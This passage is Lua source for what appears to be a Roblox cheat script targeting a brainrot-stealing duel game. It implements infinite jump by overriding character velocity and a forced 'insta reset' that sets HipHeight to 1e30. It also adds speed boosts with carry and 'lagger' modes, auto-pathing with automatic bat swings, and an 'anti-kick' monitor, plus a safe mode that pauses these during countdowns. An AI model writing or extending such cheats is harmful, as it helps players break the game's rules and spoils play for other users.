        and inp.KeyCode == Enum.KeyCode.Space then
        M.jumpHeld = true
    end
end)

UIS.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.Keyboard and inp.KeyCode == Enum.KeyCode.Space then
        M.jumpHeld = false
    end
end)

function M.startManualInfJumpLoop()
    if M.infJumpThread then M.infJumpThread:Disconnect() end
    M.infJumpThread = RunService.Heartbeat:Connect(function()
        if not M.infJumpEnabled or M.infJumpMode ~= "manual" then return end
        if not M.jumpHeld then return end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum or not root or hum.Health <= 0 then return end
        M_applyInfJumpBoost(root)
    end)
end

function M.stopManualInfJumpLoop()
    if M.infJumpThread then
        M.infJumpThread:Disconnect()
        M.infJumpThread = nil
    end
    M.jumpHeld = false
    M._infJumpBoosting = false
end

function M.startHoldInfJump()
    if M.holdInfJumpConn then M.holdInfJumpConn:Disconnect() end
    M.holdInfJumpConn = RunService.Heartbeat:Connect(function()
        if not M.infJumpEnabled or M.infJumpMode ~= "hold" then return end
        local char = player.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        -- Hold logic from original Vynx: continuous Velocity boost while Space/Jump held
        local isJumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or M.jumpHeld or (hum.Jump == true)
        local vel = root.AssemblyLinearVelocity
        if isJumpHeld and vel.Y < 35 then
            root.AssemblyLinearVelocity = Vector3.new(vel.X, 55, vel.Z)
        end
        -- Cap fall speed
        vel = root.AssemblyLinearVelocity
        if vel.Y < -120 then
            root.AssemblyLinearVelocity = Vector3.new(vel.X, -120, vel.Z)
        end
    end)
end

function M.stopHoldInfJump()
    if M.holdInfJumpConn then
        M.holdInfJumpConn:Disconnect()
        M.holdInfJumpConn = nil
    end
end


-- Apply walk/anim state safely: unwalk ONLY if toggle is ON; else anim pack; else pure original
function M.applyWalkState(char)
    char = char or player.Character
    if not char then return end
    local wantPack = M.animPackEnabled == true and type(M.animPack) == "string" and M.PACKS and M.PACKS[M.animPack]
    local wantUnwalk = M.unwalkEnabled == true and not wantPack
    if wantPack then
        M.unwalkEnabled = false
        pcall(function() M.applyAnimPack(M.animPack) end)
    elseif wantUnwalk then
        pcall(function()
            -- re-apply unwalk without flipping the flag off
            local animate = M.waitForAnimate(char)
            if not animate then return end
            M.saveOriginalAnimate(char)
            local hum = char:FindFirstChildOfClass("Humanoid")
            if M.stopAllTracks then M.stopAllTracks(hum) end
            local walkObj = M.ensureAnim(animate:FindFirstChild("walk"), "WalkAnim")
            local runObj  = M.ensureAnim(animate:FindFirstChild("run"), "RunAnim")
            M.setAnim(walkObj, 180436148)
            M.setAnim(runObj, 180426354)
        end)
    else
        -- Original game animations: do NOT rewrite flags if already off.
        -- Leave freshly spawned Animate alone (avoids walk glitches on reset).
        local hum = char:FindFirstChildOfClass("Humanoid")
        if M.stopAllTracks then pcall(function() M.stopAllTracks(hum) end) end
    end
end

-- ============================================================
-- Unwalk: custom walk feel when ON; OFF restores normal (or active anim pack)
function M.startUnwalk()
    -- Explicit toggle ON only
    M.unwalkEnabled = true
    M.animPackEnabled = false
    M.animPack = nil
    local char = player.Character
    if not char then return end
    pcall(function()
        M.saveOriginalAnimate(char)
        local animate = M.waitForAnimate(char)
        if not animate then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if M.stopAllTracks then M.stopAllTracks(hum) end
        -- classic unwalk: flat walk/run ids
        local walkObj = M.ensureAnim(animate:FindFirstChild("walk"), "WalkAnim")
        local runObj  = M.ensureAnim(animate:FindFirstChild("run"), "RunAnim")
        M.setAnim(walkObj, 180436148)
        M.setAnim(runObj, 180426354)
    end)
end

function M.stopUnwalk()
    M.unwalkEnabled = false
    local char = player.Character
    if not char then return end
    if M.animPackEnabled and M.animPack and M.PACKS and M.PACKS[M.animPack] then
        pcall(function() M.applyAnimPack(M.animPack) end)
    else
        -- Restore ORIGINAL game walk (not unwalk)
        pcall(function()
            if M.savedAnimate then
                M.resetAnimations(char)
            else
                -- No saved original: leave freshly spawned Animate alone
                local hum = char:FindFirstChildOfClass("Humanoid")
                if M.stopAllTracks then M.stopAllTracks(hum) end
            end
        end)
    end
end

-- Bugra-style instant reset: lock cam + TP far away to force respawn
M._instaResetTP = CFrame.new(2000.5, 9911.9, 4000.2)
M._isInstaResetting = false
M._resetCooldown = false
M._resetThread = nil
M._resetSuccessful = false
M._stopResetSequence = false
M._cameraLocked = false
M._lockedCameraCFrame = nil
M._resetChar = nil
local RESET_MAX_DURATION = 0.05

function M.stopInstaResetSequence()
    M._stopResetSequence = true
    if M._resetThread then
        pcall(function() task.cancel(M._resetThread) end)
        M._resetThread = nil
    end
    M._resetCooldown = false
    M._resetChar = nil
    M._cameraLocked = false
    M._isInstaResetting = false
    local character = player.Character
    if character then
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            pcall(function()
                humanoid.HipHeight = 2
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then rootPart.CanCollide = true end
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = true
                    end
                end
            end)
        end
    end
end

function M.cursedInstaReset()
    if M._resetCooldown then return end
    M._resetCooldown = true
    M._resetSuccessful = false
    M._stopResetSequence = false
    M._cameraLocked = false
    M._isInstaResetting = true

    local character = player.Character
    if not character then
        M._resetCooldown = false
        M._isInstaResetting = false
        return
    end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        M._resetCooldown = false
        M._isInstaResetting = false
        return
    end

    local camera = workspace.CurrentCamera
    if camera then
        M._lockedCameraCFrame = camera.CFrame
        M._cameraLocked = true
        camera.CFrame = M._lockedCameraCFrame
    end

    M._resetChar = character
    local isRespawning = false

    M._resetThread = task.spawn(function()
        local attempts = 0
        local maxAttempts = 40
        local originalHipHeight = humanoid.HipHeight

        while character and character.Parent and humanoid and humanoid.Health > 0 and not isRespawning and not M._stopResetSequence do
            if player.Character ~= character then
                isRespawning = true
                break
            end
            pcall(function()
                humanoid.HipHeight = 1e30
                humanoid.AutoRotate = true
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then rootPart.CanCollide = false end
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = false
                    end
                end
            end)
            if not character or not character.Parent or not humanoid or humanoid.Health <= 0 or player.Character ~= character then
                M._resetSuccessful = true
                break
            end
            attempts = attempts + 1
            if attempts >= maxAttempts then break end
            task.wait(RESET_MAX_DURATION)
        end

        if not M._resetSuccessful then
            if character and character.Parent and humanoid and humanoid.Health > 0 and not isRespawning then
                pcall(function() humanoid.Health = 0 end)
                task.wait(0.1)
                if not character.Parent or humanoid.Health <= 0 then
                    M._resetSuccessful = true
                end
            end
        end

        if not M._resetSuccessful and character and character.Parent and humanoid then
            pcall(function()
                humanoid.HipHeight = originalHipHeight
                local rootPart = character:FindFirstChild("HumanoidRootPart")
                if rootPart then rootPart.CanCollide = true end
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.CanCollide = true
                    end
                end
            end)
        end

        M._cameraLocked = false
        M._resetCooldown = false
        M._resetThread = nil
        M._resetChar = nil
        M._stopResetSequence = false
        M._isInstaResetting = false
    end)
end

-- keep camera locked during insta reset
if not M._instaResetCamConn then
    M._instaResetCamConn = RunService.Heartbeat:Connect(function()
        if M._cameraLocked and M._lockedCameraCFrame then
            local camera = workspace.CurrentCamera
            if camera then camera.CFrame = M._lockedCameraCFrame end
        end
    end)
end
player.CharacterAdded:Connect(function()
    if M.stopInstaResetSequence then pcall(M.stopInstaResetSequence) end
end)

function M.hasBrainrotInHand()
    local char = player.Character
    if not char then return false end
    for _, item in ipairs(char:GetChildren()) do
        if item:IsA("Tool") then
            local name = item.Name:lower()
            if name:find("brainrot", 1, true) or name:find("skibidi", 1, true) or name:find("toilet", 1, true) then
                return true
            end
        end
    end
    return false
end

function M.forceLaggerCarryWhileHolding()
    -- Disabled: normal mode keeps manual carry; lagger/bypass auto-switch via getActiveMoveSpeed
    return false
end

function M.toggleCarryMode()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    M.carrySpeedActive = not M.carrySpeedActive
    -- mutual exclusive: carry mode OFFS lagger carry (and vice versa handled in toggleLaggerCarry)
    if M.carrySpeedActive then
        M.laggerCarryActive = false
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    saveCherryConfig()
end

function M.toggleLaggerMode()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    M.laggerModeEnabled = not M.laggerModeEnabled
    if M.laggerModeEnabled then M.laggerCarryActive = false end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    saveCherryConfig()
end

function M.cycleLaggerModeBind()
    if M.forceLaggerCarryWhileHolding() then
        M.refreshSpeedModeLabel()
        if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
        if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
        if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
        if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
        if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
        if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
        saveCherryConfig()
        return
    end
    if not M.laggerCarryActive and not M.laggerModeEnabled then
        M.laggerCarryActive = true
        M.laggerModeEnabled = false
        M.carrySpeedActive = false
    elseif M.laggerCarryActive then
        M.laggerCarryActive = false
        M.laggerModeEnabled = true
    else
        M.laggerModeEnabled = false
        M.laggerCarryActive = true
        M.carrySpeedActive = false
    end

    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
    saveCherryConfig()
end

function M.toggleLaggerCarry()
    M.laggerCarryActive = not M.laggerCarryActive
    -- mutual exclusive with normal carry mode
    if M.laggerCarryActive then
        M.laggerModeEnabled = false
        M.carrySpeedActive = false
    end
    M.refreshSpeedModeLabel()
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.laggerModeBtn then
        M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
    end
    if M.carryModeBtn then
        M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
    end
    if M.laggerCarryBtn then
        M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
    end
    saveCherryConfig()
end
M.toggleLaggerCarryMode = M.toggleLaggerCarry

function M.stopAutoLeft()
    M.autoLeftEnabled = false
    if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
    M.alPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        if h then h:Move(Vector3.zero, false) end
    end
    if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
end

function M.stopAutoRight()
    M.autoRightEnabled = false
    if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
    M.arPhase = 1
    local char = player.Character
    if char then
        local h = char:FindFirstChildOfClass("Humanoid")
        if h then h:Move(Vector3.zero, false) end
    end
    if M.autoRightSetVisual then M.autoRightSetVisual(false) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
end

-- Original fixed-path Auto Left / Right (as before)
function M.startAutoLeft()
    if M.alConn then M.alConn:Disconnect() end
    M.alPhase = 1
    M.autoLeftEnabled = true
    M.alConn = RunService.Heartbeat:Connect(function()
        if not M.autoLeftEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.alPhase == 1 then
            local tgt = Vector3.new(M.AP_L1.X, hrp.Position.Y, M.AP_L1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.alPhase = 2
                local d = M.AP_L2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                hum:Move(mv, false)
                hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = M.AP_L1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif M.alPhase == 2 then
            local tgt = Vector3.new(M.AP_L2.X, hrp.Position.Y, M.AP_L2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                hrp.AssemblyLinearVelocity = Vector3.zero
                M.autoLeftEnabled = false
                if M.alConn then M.alConn:Disconnect(); M.alConn = nil end
                M.alPhase = 1
                if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
                if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                return
            end
            local d = M.AP_L2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
        if M.autoMoveSwingEnabled and not M._alSwingDebounce then
            M._alSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._alSwingDebounce = false end)
        end
    end)
end

function M.startAutoRight()
    if M.arConn then M.arConn:Disconnect() end
    M.arPhase = 1
    M.autoRightEnabled = true
    M.arConn = RunService.Heartbeat:Connect(function()
        if not M.autoRightEnabled then return end
        local char = player.Character
        if not char then return end
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        local spd = (M.getAutoPathSpeed and M.getAutoPathSpeed()) or (M.NS or 60)
        if M.arPhase == 1 then
            local tgt = Vector3.new(M.AP_R1.X, hrp.Position.Y, M.AP_R1.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                M.arPhase = 2
                local d = M.AP_R2 - hrp.Position
                local mv = Vector3.new(d.X, 0, d.Z)
                if mv.Magnitude > 0.01 then mv = mv.Unit end
                hum:Move(mv, false)
                hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
                return
            end
            local d = M.AP_R1 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        elseif M.arPhase == 2 then
            local tgt = Vector3.new(M.AP_R2.X, hrp.Position.Y, M.AP_R2.Z)
            if (tgt - hrp.Position).Magnitude < 1 then
                hum:Move(Vector3.zero, false)
                hrp.AssemblyLinearVelocity = Vector3.zero
                M.autoRightEnabled = false
                if M.arConn then M.arConn:Disconnect(); M.arConn = nil end
                M.arPhase = 1
                if M.autoRightSetVisual then M.autoRightSetVisual(false) end
                if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                return
            end
            local d = M.AP_R2 - hrp.Position
            local mv = Vector3.new(d.X, 0, d.Z)
            if mv.Magnitude > 0.01 then mv = mv.Unit end
            hum:Move(mv, false)
            hrp.AssemblyLinearVelocity = Vector3.new(mv.X * spd, hrp.AssemblyLinearVelocity.Y, mv.Z * spd)
        end
        if M.autoMoveSwingEnabled and not M._arSwingDebounce then
            M._arSwingDebounce = true
            local bat = M.findBat and M.findBat() or (M.findBatForAimbot and M.findBatForAimbot())
            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._arSwingDebounce = false end)
        end
    end)
end

function M.enableAntiKick()
    M.antiKickEnabled = true
    task.spawn(function()
        while M.antiKickEnabled do
            task.wait(0.5)
            local char = player.Character
            if char then
                local found = false
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        local n = tool.Name:lower()
                        if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
                            found = true
                            break
                        end
                    end
                end
                M.brainrotDetected = found
                if found then
                    if M.autoBatEnabled then M.stopBatAimbot() end
                    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
                    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
                end
            end
        end
    end)
end

function M.disableAntiKick()
    M.antiKickEnabled = false
    M.antiSummerBaseEnabled = false
    M.customFontSelected = "None"
    M.brainrotDetected = false
end

--------------------------------------------------------------------------------
-- SAFE MODE (locks combat during duel countdown / while holding brainrot)
--------------------------------------------------------------------------------
function M.safeModeGetCountdownLabel()
    local ok, label = pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        if not pg then return nil end
        local top = pg:FindFirstChild("DuelsMachineTopFrame")
        if not top then return nil end
        local inner = top:FindFirstChild("DuelsMachineTopFrame")
        if not inner then return nil end
        local timer = inner:FindFirstChild("Timer")
        if not timer then return nil end
        return timer:FindFirstChild("Label")
    end)
    return (ok and label) or nil
end

function M.safeModeCountdownNumber(text)
    local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
    if t == "GO" or t == "START" or t == "READY" then return true end
    local n = tonumber(t)
    return n ~= nil and n >= 0 and n <= 10
end

function M.safeModeInDuelCountdown()
    local label = M.safeModeGetCountdownLabel()
    return label and M.safeModeCountdownNumber(label.Text) or false
end

M.SAFE_MODE_BLOCKED_TOOLS = {
    bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
    medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
}

function M.safeModeIsCarryableTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    local name = tool.Name:lower()
    for word in pairs(M.SAFE_MODE_BLOCKED_TOOLS) do
        if name:find(word, 1, true) then return false end
    end
    return true
end

function M.safeModeHoldingBrainrot()
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return player:GetAttribute("AntiKick") end)
    if ok2 and val2 == true then return true end
    local char = player.Character
    if not char then return false end
    local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok3 and val3 == true then return true end
    if M.brainrotDetected then return true end
    if M.hasBrainrotInHand and M.hasBrainrotInHand() then return true end
    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
                return true
            end
        end
    end
    return false
end

function M.safeModeIsLocked()
    if not M.safeModeEnabled then return false end
    return M.safeModeInDuelCountdown() or M.safeModeHoldingBrainrot()
end

function M.safeModeForceStop(reason)
    local stopped = false
    if M.autoBatEnabled then
        M.stopBatAimbot()
        stopped = true
    end
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
        stopped = true
    end
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
        stopped = true
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
        stopped = true
    end
    if stopped then
        -- optional toast; silent if no notifier
        pcall(function()
            if type(showActionNotification) == "function" then
                showActionNotification(reason or "SAFE MODE LOCK")
            end
        end)
    end
end

function M.safeModeTryStart()
    if M.safeModeIsLocked() then
        M.safeModeForceStop("SAFE MODE LOCK")
        return false
    end
    return true
end

function M.enableSafeMode()
    M.safeModeEnabled = true
end

function M.disableSafeMode()
    M.safeModeEnabled = false
end

if not M._safeModeMonitorStarted then
    M._safeModeMonitorStarted = true
    RunService.Heartbeat:Connect(function()
        if M.safeModeEnabled and M.safeModeIsLocked() then
            M.safeModeForceStop("SAFE MODE LOCK")
        end
    end)
end


function M.isStealState()
    -- Match auto-switch carry script: WalkSpeed drops while carrying / stealing
    local char = player.Character
    if not char then return false end
    if M.hasBrainrotInHand() then return true end
    local h = char:FindFirstChildOfClass("Humanoid")
    if h and h.WalkSpeed < 25 then return true end
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and val2 == true then return true end
    return false
end

function M.getActiveMoveSpeed()
    local holding = M.hasBrainrotInHand() or M.isStealState()

    -- Speed Customizer mode: path Normal/Lagger ONLY via speedBoosterPath (instant keybind switch)
    if (M.speedUIMode or "Original") == "Customizer" then
        if M.speedBoosterEnabled == false then
            return 16
        end
        local useLagger = (tostring(M.speedBoosterPath) == "Lagger")
        if useLagger then
            if holding then return tonumber(M.LAGGER_CARRY_SPEED) or 22 end
            return tonumber(M.LAGGER_SPEED) or 22
        end
        if holding then return tonumber(M.CS) or 30 end
        return tonumber(M.NS) or 60
    end

    -- LAGGER: auto normal/carry on brainrot
    if M.laggerModeEnabled or M.laggerCarryActive then
        if holding then
            return tonumber(M.LAGGER_CARRY_SPEED) or 22
        end
        return tonumber(M.LAGGER_SPEED) or 22
    end

    -- NORMAL: manual carry mode only
    if M.carrySpeedActive then
        return tonumber(M.CS) or 30
    end
    return tonumber(M.NS) or 60
end

-- Instant Normal/Lagger path switch for Speed Customizer keybinds (no lag)
function M.setSpeedCustomizerPath(pathName)
    pathName = (tostring(pathName) == "Lagger") and "Lagger" or "Normal"
    -- set path FIRST so getActiveMoveSpeed sees it immediately
    M.speedBoosterEnabled = true
    M.speedBoosterPath = pathName
    M.laggerModeEnabled = (pathName == "Lagger")
    M.laggerCarryActive = false
    M.carrySpeedActive = false
    -- UI sync (must not overwrite path back to Lagger)
    if M.speedBoosterApplyPath then
        pcall(function() M.speedBoosterApplyPath(pathName, true) end)
    end
    if M.speedBoosterSyncPath then
        pcall(function() M.speedBoosterSyncPath(pathName) end)
    end
    -- re-assert path after UI helpers (guards against panel forcing Lagger)
    M.speedBoosterPath = pathName
    M.laggerModeEnabled = (pathName == "Lagger")
    M.laggerCarryActive = false
    M.carrySpeedActive = false
    if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(pathName == "Lagger") end) end
    if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(false) end) end
    if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(false) end) end
    if M.laggerModeBtn then M.laggerModeBtn.Text = (pathName == "Lagger") and "Lag On" or "Lag Off" end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then pcall(M.refreshSpeedModeLabel) end
    task.defer(function() pcall(saveCherryConfig) end)
end

function M.toggleSpeedCustomizerPath()
    local cur = tostring(M.speedBoosterPath)
    if cur == "Lagger" then
        M.setSpeedCustomizerPath("Normal")
    else
        M.setSpeedCustomizerPath("Lagger")
    end
end

function M.getAutoPathSpeed()
    if M.laggerModeEnabled or M.laggerCarryActive then return M.LAGGER_SPEED
    else return M.NS end
end

function M.setModeNormalFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
    if M.refreshSpeedCustomizerPanelUI then M.refreshSpeedCustomizerPanelUI() end
end

-- Clean Lagger mode for Speed Customizer (instant switch)
function M.setModeLaggerFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = true
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(true) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag On" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
    if M.refreshSpeedCustomizerPanelUI then M.refreshSpeedCustomizerPanelUI() end
end

function M.setModeCarryFlags()
    M.carrySpeedActive = true
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
end

function M.setModeLaggerCarryFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = true
